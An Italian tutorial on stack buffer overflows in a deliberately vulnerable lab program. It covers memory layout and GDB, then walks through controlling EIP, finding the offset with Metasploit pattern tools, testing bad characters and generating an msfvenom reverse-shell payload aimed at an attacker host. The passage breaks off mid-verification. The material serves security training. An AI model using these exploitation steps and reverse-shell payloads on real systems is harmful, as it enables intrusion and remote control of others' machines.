# Teoria

Le eccezioni di memoria sono la reazione del sistema operativo a un errore nel software esistente o durante l'esecuzione di questo. Ciò è responsabile della maggior parte delle vulnerabilità di sicurezza nei flussi di programma dell'ultimo decennio. Spesso si verificano errori di programmazione che portano a buffer overflow a causa di disattenzioni quando si programma con linguaggi poco astratti come C o C++.

Questi linguaggi vengono compilati quasi direttamente in codice macchina e, a differenza dei linguaggi altamente astratti come Java o Python, vengono eseguiti attraverso un sistema operativo con una struttura di controllo minima o nulla. I buffer overflow sono errori che permettono a dati troppo grandi di entrare in un buffer della memoria del sistema operativo non sufficientemente grande, facendolo quindi traboccare. Come risultato di questa gestione errata, la memoria di altre funzioni del programma eseguito viene sovrascritta, creando potenzialmente una vulnerabilità di sicurezza.

Un programma di questo tipo (file binario) è un file generale eseguibile memorizzato su un supporto di memorizzazione dati. Esistono diversi formati di file per tali file binari eseguibili. Ad esempio, il Portable Executable Format (PE) è utilizzato sulle piattaforme Microsoft.

Un altro formato per i file eseguibili è l'Executable and Linking Format (ELF), supportato da quasi tutte le moderne varianti di UNIX. Se il linker carica un file binario eseguibile e il programma viene eseguito, il codice del programma corrispondente viene caricato nella memoria principale e quindi eseguito dalla CPU.

I programmi memorizzano dati e istruzioni nella memoria durante l'inizializzazione e l'esecuzione. Si tratta di dati che vengono visualizzati nel software eseguito o inseriti dall'utente. Soprattutto per gli input previsti dall'utente, è necessario creare in anticipo un buffer salvando l'input.

Le istruzioni sono utilizzate per modellare il flusso del programma. Tra l'altro, nella memoria sono memorizzati gli indirizzi di ritorno, che fanno riferimento ad altri indirizzi di memoria e definiscono quindi il flusso di controllo del programma. Se tale indirizzo di ritorno viene deliberatamente sovrascritto utilizzando un buffer overflow, un aggressore può manipolare il flusso del programma facendo in modo che l'indirizzo di ritorno faccia riferimento a un'altra funzione o subroutine. Inoltre, sarebbe possibile saltare indietro a un codice precedentemente introdotto dall'input dell'utente.

Per capire come funziona a livello tecnico, dobbiamo familiarizzare con il modo in cui:

- la memoria viene suddivisa e utilizzata
- il debugger visualizza e denomina le singole istruzioni
- il debugger può essere usato per rilevare tali vulnerabilità
- possiamo manipolare la memoria

Un altro punto critico è che gli exploit di solito funzionano solo per una versione specifica del software e del sistema operativo. Pertanto, dobbiamo ricostruire e riconfigurare il sistema di destinazione per portarlo allo stesso stato. Dopodiché, il programma che stiamo analizzando viene installato e analizzato. Nella maggior parte dei casi, avremo un solo tentativo di sfruttare il programma se perdiamo l'opportunità di riavviarlo con privilegi elevati.


La memoria

Quando il programma viene chiamato, le sezioni vengono mappate sui segmenti del processo e i segmenti vengono caricati in memoria come descritto dal file ELF.

Buffer
![](img/buffer_overflow_1.png)

.testo

La sezione .text contiene le istruzioni assembler del programma. Quest'area può essere di sola lettura per evitare che il processo modifichi accidentalmente le istruzioni. Qualsiasi tentativo di scrittura in quest'area provocherà inevitabilmente un errore di segmentazione.
.dati

La sezione .data contiene variabili globali e statiche che vengono inizializzate esplicitamente dal programma.
.bss

Diversi compilatori e linker utilizzano la sezione .bss come parte del segmento dati, che contiene variabili allocate staticamente e rappresentate esclusivamente da 0 bit.
L'Heap

La memoria Heap viene allocata da quest'area. Quest'area inizia alla fine del segmento ".bss" e cresce fino agli indirizzi di memoria più alti.

Lo stack

La memoria stack è una struttura di dati Last-In-First-Out in cui vengono memorizzati gli indirizzi di ritorno, i parametri e, a seconda delle opzioni del compilatore, i puntatori ai frame. Le variabili locali del C/C++ sono memorizzate qui e si può anche copiare il codice nello stack. Lo stack è un'area definita nella RAM. Il linker riserva quest'area e di solito colloca lo stack nell'area inferiore della RAM, sopra le variabili globali e statiche. L'accesso al contenuto avviene tramite il puntatore allo stack, impostato all'estremità superiore dello stack durante l'inizializzazione. Durante l'esecuzione, la parte allocata dello stack cresce fino agli indirizzi di memoria inferiori.

Le moderne protezioni della memoria (DEP/ASLR) prevengono i danni causati dai buffer overflow. Il DEP (Data Execution Prevention) contrassegna le regioni di memoria "di sola lettura". Le regioni di memoria di sola lettura sono quelle in cui vengono memorizzati alcuni input dell'utente (esempio: lo stack), quindi l'idea alla base del DEP era di impedire agli utenti di caricare shellcode nella memoria e poi impostare il puntatore all'istruzione dello shellcode. Per aggirare questo problema, gli hacker hanno iniziato a utilizzare la ROP (Return Oriented Programming), che consente di caricare lo shellcode in uno spazio eseguibile e di utilizzare le chiamate esistenti per eseguirlo. Con la ROP, l'aggressore deve conoscere gli indirizzi di memoria in cui sono memorizzati gli oggetti, quindi la difesa contro di essa è stata l'implementazione dell'ASLR (Address Space Layout Randomization), che randomizza la posizione di tutti gli oggetti, rendendo la ROP più difficile.

Gli utenti possono aggirare l'ASLR facendo trapelare gli indirizzi di memoria, ma questo rende gli exploit meno affidabili e talvolta impossibili. Ad esempio, il "Freefloat FTP Server" è banale da sfruttare su Windows XP (prima di DEP/ASLR). Tuttavia, se l'applicazione viene eseguita su un moderno sistema operativo Windows, l'overflow del buffer esiste, ma al momento non è banale da sfruttare a causa di DEP/ASLR, perché non esiste un modo noto per far trapelare gli indirizzi di memoria.

Programma vulnerabile

Stiamo scrivendo un semplice programma C chiamato bow.c con una funzione vulnerabile chiamata strcpy().

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bowfunc(char *string) {

	char buffer[1024];
	strcpy(buffer, string);
	return 1;
}

int main(int argc, char *argv[]) {

	bowfunc(argv[1]);
	printf("Done.\n");
	return 1;
}

```

I sistemi operativi moderni dispongono di protezioni integrate contro tali vulnerabilità, come l'Address Space Layout Randomization (ASLR). Per imparare le basi dello sfruttamento di un buffer overflow, disabiliteremo queste funzioni di protezione della memoria:

```shell
$ sudo su
# echo 0 > /proc/sys/kernel/randomize_va_space
# cat /proc/sys/kernel/randomize_va_space

0
```

Successivamente, compiliamo il codice C in un binario ELF a 32 bit.

```shell
$ gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32
$ file bow32 | tr "," "\n"

bow: ELF 32-bit LSB shared object
 Intel 80386
 version 1 (SYSV)
 dynamically linked
 interpreter /lib/ld-linux.so.2
 for GNU/Linux 3.2.0
 BuildID[sha1]=93dda6b77131deecaadf9d207fdd2e70f47e1071
 not stripped

```

Funzioni C vulnerabili

Nel linguaggio di programmazione C esistono diverse funzioni vulnerabili che non proteggono in modo indipendente la memoria. Ecco alcune di queste funzioni:

- `strcpy`
- `ottiene`
- `sprintf`
- `scanf`
- `strcat`
- `...`


Introduzione a GDB

GDB, o GNU Debugger, è il debugger standard dei sistemi Linux sviluppato dal progetto GNU. È stato portato su molti sistemi e supporta i linguaggi di programmazione C, C++, Objective-C, FORTRAN, Java e molti altri.

GDB offre le consuete funzioni di tracciabilità, come i punti di interruzione o la traccia dello stack, e permette di intervenire nell'esecuzione dei programmi. Ci permette anche, ad esempio, di manipolare le variabili dell'applicazione o di chiamare funzioni indipendentemente dalla normale esecuzione del programma.

Utilizziamo GNU Debugger (GDB) per visualizzare il binario creato a livello di assemblatore. Una volta eseguito il binario con GDB, possiamo disassemblare la funzione principale del programma.

```shell
$ gdb -q bow32

Reading symbols from bow...(no debugging symbols found)...done.
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>: 	lea    0x4(%esp),%ecx
   0x00000586 <+4>: 	and    $0xfffffff0,%esp
   0x00000589 <+7>: 	pushl  -0x4(%ecx)
   0x0000058c <+10>:	push   %ebp
   0x0000058d <+11>:	mov    %esp,%ebp
   0x0000058f <+13>:	push   %ebx
   0x00000590 <+14>:	push   %ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:	add    $0x1a3e,%ebx
   0x0000059c <+26>:	mov    %ecx,%eax
   0x0000059e <+28>:	mov    0x4(%eax),%eax
   0x000005a1 <+31>:	add    $0x4,%eax
   0x000005a4 <+34>:	mov    (%eax),%eax
   0x000005a6 <+36>:	sub    $0xc,%esp
   0x000005a9 <+39>:	push   %eax
   0x000005aa <+40>:	call   0x54d <bowfunc>
   0x000005af <+45>:	add    $0x10,%esp
   0x000005b2 <+48>:	sub    $0xc,%esp
   0x000005b5 <+51>:	lea    -0x1974(%ebx),%eax
   0x000005bb <+57>:	push   %eax
   0x000005bc <+58>:	call   0x3e0 <puts@plt>
   0x000005c1 <+63>:	add    $0x10,%esp
   0x000005c4 <+66>:	mov    $0x1,%eax
   0x000005c9 <+71>:	lea    -0x8(%ebp),%esp
   0x000005cc <+74>:	pop    %ecx
   0x000005cd <+75>:	pop    %ebx
   0x000005ce <+76>:	pop    %ebp
   0x000005cf <+77>:	lea    -0x4(%ecx),%esp
   0x000005d2 <+80>:	ret    
End of assembler dump.
```
Nella prima colonna, i numeri esadecimali rappresentano gli indirizzi di memoria. I numeri con il segno più (+) indicano i salti di indirizzo in memoria in byte, utilizzati per la rispettiva istruzione. Successivamente, si possono vedere le istruzioni assembler (mnemoniche) con i registri e i relativi suffissi di funzionamento. La sintassi attuale è AT&T, riconoscibile dai caratteri % e $.

La sintassi Intel rende la rappresentazione disassemblata più facile da leggere e si può cambiare la sintassi inserendo i seguenti comandi in GDB:

```shell
(gdb) set disassembly-flavor intel
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>:	    lea    ecx,[esp+0x4]
   0x00000586 <+4>:	    and    esp,0xfffffff0
   0x00000589 <+7>:	    push   DWORD PTR [ecx-0x4]
   0x0000058c <+10>:	push   ebp
   0x0000058d <+11>:	mov    ebp,esp
   0x0000058f <+13>:	push   ebx
   0x00000590 <+14>:	push   ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:	add    ebx,0x1a3e
   0x0000059c <+26>:	mov    eax,ecx
   0x0000059e <+28>:	mov    eax,DWORD PTR [eax+0x4]
<SNIP>
```

Non è necessario cambiare continuamente la modalità di visualizzazione manualmente. Possiamo anche impostare questa sintassi come predefinita con il seguente comando.

```shell
$ echo 'set disassembly-flavor intel' > ~/.gdbinit
```

La differenza tra la sintassi AT&T e quella Intel non sta solo nella presentazione delle istruzioni con i relativi simboli, ma anche nell'ordine e nella direzione in cui le istruzioni vengono eseguite e lette.

Prendiamo come esempio la seguente istruzione:

```shell
   0x0000058d <+11>: mov ebp,esp
```

Con la sintassi Intel, abbiamo il seguente ordine per l'istruzione dell'esempio:

mov 	ebp 	esp

con la sintassi AT&T

mov 	%esp 	%ebp


Registri della CPU

I registri sono i componenti essenziali di una CPU. Quasi tutti i registri offrono una piccola quantità di spazio di memoria in cui memorizzare temporaneamente i dati. Tuttavia, alcuni di essi hanno una funzione particolare.

Questi registri vengono suddivisi in registri generali, registri di controllo e registri di segmento. I registri più critici di cui abbiamo bisogno sono i registri generali. Questi ultimi sono ulteriormente suddivisi in registri dati, registri puntatori e registri indice.


Data registers
32-bit Register 	64-bit Register 	Description
EAX 	RAX 	Accumulator is used in input/output and for arithmetic operations
EBX 	RBX 	Base is used in indexed addressing
ECX 	RCX 	Counter is used to rotate instructions and count loops
EDX 	RDX 	Data is used for I/O and in arithmetic operations for multiply and divide operations involving large values

Pointer registers
32-bit Register 	64-bit Register 	Description
EIP 	RIP 	Instruction Pointer stores the offset address of the next instruction to be executed
ESP 	RSP 	Stack Pointer points to the top of the stack
EBP 	RBP 	Base Pointer is also known as Stack Base Pointer or Frame Pointer thats points to the base of the stack

Stack Frames

Poiché lo stack inizia con un indirizzo alto e cresce fino agli indirizzi di memoria bassi man mano che vengono aggiunti valori, il puntatore di base punta all'inizio (base) dello stack, a differenza del puntatore di pila, che punta alla parte superiore dello stack.

Man mano che lo stack cresce, viene logicamente diviso in regioni chiamate Stack Frames, che allocano la memoria necessaria nello stack per la funzione corrispondente. Uno stack frame definisce una cornice di dati con l'inizio (EBP) e la fine (ESP) che viene inserita nello stack quando viene chiamata una funzione.

Poiché la memoria dello stack è costruita su una struttura di dati Last-In-First-Out (LIFO), il primo passo è quello di memorizzare la precedente posizione EBP sullo stack, che può essere ripristinata al termine della funzione. Se ora osserviamo la funzione bowfunc, in GDB si presenta come segue:

```shell
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       # <---- 1. Stores previous EBP
   0x0000054e <+1>:	    mov    ebp,esp
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404
   <...SNIP...>
   0x00000580 <+51>:	leave  
   0x00000581 <+52>:	ret  
```

L'EBP nello stack frame viene impostato per primo quando viene chiamata una funzione e contiene l'EBP dello stack frame precedente. Successivamente, il valore dell'ESP viene copiato nell'EBP, creando un nuovo stack frame.

```gdb
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       # <---- 1. Stores previous EBP
   0x0000054e <+1>:	    mov    ebp,esp   # <---- 2. Creates new Stack Frame
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 
   <...SNIP...>
   0x00000580 <+51>:	leave  
   0x00000581 <+52>:	ret    

```

Quindi viene creato dello spazio nello stack, spostando l'ESP in cima per le operazioni e le variabili necessarie ed elaborate.

```shell

(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       # <---- 1. Stores previous EBP
   0x0000054e <+1>:	    mov    ebp,esp   # <---- 2. Creates new Stack Frame
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 # <---- 3. Moves ESP to the top
   <...SNIP...>
   0x00000580 <+51>:	leave  
   0x00000581 <+52>:	ret    
```

Queste tre istruzioni rappresentano il cosiddetto Prologo.

Per uscire dallo stack frame, si fa il contrario, l'Epilogo. Durante l'epilogo, l'ESP viene sostituito dall'EBP corrente e il suo valore viene riportato al valore che aveva prima nel prologo. L'epilogo è relativamente breve e, a parte altre possibilità di esecuzione, nel nostro esempio viene eseguito con due istruzioni:


```shell
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       
   0x0000054e <+1>:	    mov    ebp,esp   
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 
   <...SNIP...>
   0x00000580 <+51>:	leave  # <----------------------
   0x00000581 <+52>:	ret    # <--- Leave stack frame

```

Registri indice
Registro a 32 bit Registro a 64 bit Descrizione
ESI RSI Source Index è utilizzato come puntatore a una sorgente per le operazioni sulle stringhe.
EDI RDI Destinazione viene utilizzato come puntatore a una destinazione per le operazioni sulle stringhe.

Un altro punto importante della rappresentazione dell'assemblatore è la denominazione dei registri. Questo dipende dal formato in cui è stato compilato il binario. Abbiamo utilizzato GCC per compilare il codice bow.c in formato 32 bit. Ora compiliamo lo stesso codice in un formato a 64 bit.


Endianness

Durante le operazioni di caricamento e salvataggio nei registri e nelle memorie, i byte vengono letti in un ordine diverso. Questo ordine di byte è chiamato endianness. L'endianness si distingue tra il formato little-endian e il formato big-endian.

Big-endian e little-endian riguardano l'ordine di valenza. In big-endian, le cifre con la valenza più alta sono all'inizio. Nel formato little-endian, le cifre con la valenza più bassa si trovano all'inizio. I processori mainframe utilizzano il formato big-endian, alcune architetture RISC, i minicomputer e nelle reti TCP/IP l'ordine dei byte è anch'esso in formato big-endian.

Vediamo ora un esempio con i seguenti valori:

- Address: `0xffff0000`
- Word: `\xAA\xBB\xCC\xDD`

Indirizzo di memoria 0xffff0000 0xffff0001 0xffff0002 0xffff0003
Big-Endian AA BB CC DD
Little-Endian DD CC BB AA

Questo è molto importante per inserire il nostro codice nell'ordine giusto quando dovremo dire alla CPU a quale indirizzo deve puntare.

# Exploit

Passi:

1. Prendere il controllo del registro EIP
2. Determinare la lunghezza del payload
3. Identificare eventuali caratti malevoli
4. Generazione del payload
5. Trovare l'indirizzo di ritorno
6. Esecuzione

## Prendere il controllo del registro EIP

Uno degli aspetti più importanti di un buffer overflow basato sullo stack è quello di tenere sotto controllo il puntatore all'istruzione (EIP), in modo da potergli dire a quale indirizzo deve saltare. In questo modo l'EIP punterà all'indirizzo da cui parte il nostro shellcode e la CPU lo eseguirà.

Possiamo eseguire i comandi in GDB usando Python, che ci serve direttamente come input.

```shell
$ gdb -q bow32
(gdb) run $(python -c "print '\x55' * 1200")
```

EIP e' stato sovrascritto. Se non dovesse essere cosi, aumentiamo la quantita' di caratteri.

```shell
(gdb) info registers

eax            0x1	1
ecx            0xffffd6c0	-10560
edx            0xffffd06f	-12177
ebx            0x55555555	1431655765
esp            0xffffcfd0	0xffffcfd0
ebp            0x55555555	0x55555555		# <---- EBP overwritten
esi            0xf7fb5000	-134524928
edi            0x0	0
eip            0x55555555	0x55555555		# <---- EIP overwritten
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

Ciò significa che dobbiamo accedere in scrittura all'EIP. Questo, a sua volta, permette di specificare a quale indirizzo di memoria l'EIP deve saltare. Tuttavia, per manipolare il registro, abbiamo bisogno di un numero esatto di 'U' fino all'EIP, in modo che i 4 byte successivi possano essere sovrascritti con l'indirizzo di memoria desiderato.

### Determinare la lunghezza dell'offset

L'offset viene utilizzato per determinare quanti byte sono necessari per sovrascrivere il buffer e quanto spazio abbiamo a disposizione per il nostro shellcode.

Lo shellcode è un codice di programma che contiene le istruzioni per un'operazione che vogliamo far eseguire alla CPU. La creazione manuale dello shellcode sarà discussa in dettaglio in altri moduli. Ma per risparmiare tempo, prima utilizziamo il Metasploit Framework (MSF) che offre uno script Ruby chiamato "pattern_create" che può aiutarci a determinare il numero esatto di byte per raggiungere l'EIP. Crea una stringa unica basata sulla lunghezza dei byte specificati per aiutare a determinare l'offset.

```shell
# creazione del pattern
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
```

Ora sostituiamo le nostre 1200 "U" con i modelli generati e concentriamo nuovamente la nostra attenzione sull'EIP.

```shell
# uso del pattern appena generato
(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'")

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'")
Program received signal SIGSEGV, Segmentation fault.
0x69423569 in ?? ()

(gdb) info registers eip
eip            0x69423569	0x69423569
```

Vediamo che l'EIP visualizza un indirizzo di memoria diverso e possiamo usare un altro strumento MSF chiamato "pattern_offset" per calcolare il numero esatto di caratteri (offset) necessari per passare all'EIP.

```shell
# calcolo preciso delle dimensioni dell'offset
# 0x69423569 e' l'indirizzo di memoria trovato ispezionando il binario con (gdb) info registers eip
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
[*] Exact match at offset 1036
```

Se ora utilizziamo esattamente questo numero di byte per le nostre "U", dovremmo arrivare esattamente sull'EIP. Per sovrascriverlo e verificare se lo abbiamo raggiunto come previsto, possiamo aggiungere altri 4 byte con "\x66" ed eseguirlo per assicurarci di controllare l'EIP.

```shell
# il valore exact_match e' restituito in output da
# $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
# dove 0x69423569 e' l'indirizzo di memoria trovato ispezionando il binario con (gdb) info registers eip
# dopo aver runnato il binaro con il payload
(gdb) run $(python -c "print '\x55' * <exact_match> + '\x66' * 4")

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1036 + '\x66' * 4")
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()

(gdb) info registers eip
eip            0x66666666       0x66666666
```

Ora vediamo che abbiamo sovrascritto l'EIP con i nostri caratteri "\x66".

```shell
# risultato attesto
(gdb) info registers eip
eip            0x66666666       0x66666666
```

## Determinare la lunghezza del shellcode

Ora dobbiamo scoprire quanto spazio abbiamo a disposizione per il nostro shellcode per eseguire l'azione che vogliamo. È di moda e utile sfruttare questa vulnerabilità per ottenere una reverse shell. Per prima cosa, dobbiamo scoprire quanto sarà grande lo shellcode che inseriremo e per questo useremo `msfvenom`.

```shell
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<MYIP> lport=31337 --platform linux --arch x86 --format c > shellcode
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
```

Ora sappiamo che il nostro payload sarà di circa `68 byte`. Per precauzione, dovremmo cercare di prendere un intervallo più grande se lo shellcode aumenta a causa di specifiche successive.

Spesso può essere utile inserire qualche `no operation instruction` (`NOPS`) prima dell'inizio del nostro shellcode, in modo che possa essere eseguito in modo pulito. Riassumiamo brevemente ciò di cui abbiamo bisogno:

- Abbiamo bisogno di un totale di `1040 byte` per arrivare all'`EIP`. (exact_match + 4)
- In questo caso, possiamo utilizzare altri `100 byte` di `NOP`. (un po di padding che non guasta mai)
- `150 byte` per il nostro shellcode. (esageriamo un po la dimensione reale di 68 byte)

```shell
    Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786

      NOPs = "\x90" * 100
 Shellcode = "\x44" * 150
       EIP = "\x66" * 4
```

Ora possiamo cercare di capire quanto spazio abbiamo a disposizione per inserire il nostro shellcode.

```shell
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()

# risultato atteso
(gdb) info registers eip
eip            0x66666666       0x66666666
```

Se l'EIP ha esattamente i byte che ci aspettiamo abbiamo fatto i conti giusti XD! Abbiamo uno spazio totale di 250bytes per lo shellcode (dimensione reale aumentata 150 + nops 100).

## Identificare eventuali caratti malevoli

In precedenza, nei sistemi operativi UNIX, i file binari iniziavano con due byte contenenti un `numero magico` che determinava il tipo di file. All'inizio questo veniva usato per identificare i file oggetto per le diverse piattaforme. Gradualmente questo concetto è stato trasferito ad altri file e ora quasi tutti i file contengono un numero magico.

Tali caratteri riservati esistono anche nelle applicazioni, ma non sono sempre presenti e non sono sempre gli stessi. Questi caratteri riservati, noti anche come `caratteri negativi`, possono variare, ma spesso si vedono caratteri come questo:

- `\x00` Byte nullo
- `\x0A` Avanzamento di riga
- `\x0D` Ritorno a capo
- `\xFF` Avanzamento di forma

Utilizziamo il seguente elenco di caratteri per scoprire tutti i caratteri che dobbiamo considerare ed evitare quando generiamo il nostro codice shell.

```shell
$ CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

Per calcolare il numero di byte nella nostra variabile CHARS, possiamo usare bash sostituendo la "\x" con uno spazio e poi usare wc per contare le parole.

```shell
# questo test conviene farlo sulla macchina vittima (su kali wc -w non da lo stesso risultato)
$ echo $CHARS | sed 's/\\x/ /g' | wc -w
256
```

Questa stringa è lunga 256 byte. Dobbiamo quindi calcolare nuovamente il nostro buffer.

```shell
Buffer = "\x55" * (1040 - 256 - 4) = 780

 CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   EIP = "\x66" * 4
```

Ora diamo un'occhiata all'intera funzione principale. Perché se la eseguiamo ora, il programma si bloccherà senza darci la possibilità di seguire ciò che accade nella memoria. Impostiamo quindi un punto di interruzione nella funzione corrispondente, in modo che l'esecuzione si fermi a questo punto e si possa analizzare il contenuto della memoria.

```shell
(gdb) disas main

(gdb) break bowfunc # la funziona va trovata disas main

(gdb) run $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
/bin/bash: warning: command substitution: ignored null byte in input

Breakpoint 1, 0x56555551 in bowfunc ()

(gdb) x/2000xb $esp+500

0xffffd28a:	0xbb	0x69	0x36	0x38	0x36	0x00	0x00	0x00
0xffffd292:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffd29a:	0x00	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x73
0xffffd2a2:	0x74	0x75	0x64	0x65	0x6e	0x74	0x2f	0x62
0xffffd2aa:	0x6f	0x77	0x2f	0x62	0x6f	0x77	0x33	0x32
0xffffd2b2:	0x00    0x55	0x55	0x55	0x55	0x55	0x55	0x55
				  # |---> "\x55"s begin
0xffffd2ba: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd2c2: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
<SNIP>
```

Qui riconosciamo a quale indirizzo inizia il nostro "\x55". Da qui possiamo andare più in basso e cercare il punto in cui inizia il nostro CHARS.

```shell
<SNIP>
0xffffd5aa:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5b2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
												  # |---> CHARS begin
0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
0xffffd5d2:	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b	0x1c
<SNIP>
```

Vediamo dove finisce il nostro `\x55` e dove inizia la variabile `CHARS`. Ma se la osserviamo da vicino, vedremo che inizia con `\x01` invece che con `\x00`. Abbiamo già visto l'avviso durante l'esecuzione che il `null byte` nel nostro input è stato ignorato.

Possiamo quindi prendere nota di questo carattere, rimuoverlo dalla nostra variabile CHARS e regolare il numero del nostro `\x55`.

```shell
# Substract the number of removed characters
Buffer = "\x55" * (1040 - 255 - 4) = 781

# "\x00" removed: 256 - 1 = 255 bytes
  CHARS = "\x01\x02\x03...<SNIP>...\xfd\xfe\xff"
    EIP = "\x66" * 4
```

continuiamo questa operazione fino a trovare tutti i caratteri che saltano e di volta in volta aggiorniamo la dimensione del buffer e riproviamo rimuovendo il byte che da fastidio.

Prendiamo nota dei caratteri eliminati perche' servirano nella fase sucessiva di generazione della shellcode. In questo caso sono `\x00\x09\x0a\x20`

## Generazione del shellcode

Abbiamo già conosciuto lo strumento `msfvenom` con il quale abbiamo generato la lunghezza approssimativa del nostro shellcode. Ora possiamo utilizzare nuovamente questo strumento per generare lo shellcode vero e proprio, che fa eseguire alla CPU del nostro sistema di destinazione il comando desiderato.

Ma prima di generare il nostro shellcode, dobbiamo assicurarci che i singoli componenti e le proprietà corrispondano al sistema di destinazione. Pertanto, dobbiamo prestare attenzione alle seguenti aree:

- Architettura
- Piattaforma
- Bad Characters

```shell
$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
Saved as: shellcode
```

Aggiorniamo i conti con la dimensione di questo payload

```shell
   Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817

     NOPs = "\x90" * 124
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4
```

```shell
# usiamo lo shellcode generato
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
# Next, we check if the first bytes of our shellcode match the bytes after the NOPS.
(gdb) x/2000xb $esp+550

0xffffd726:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd72e:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd736:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd73e:     0x90    0x90    0x90    0x90    0x90    0xb8    0x69    0x9d
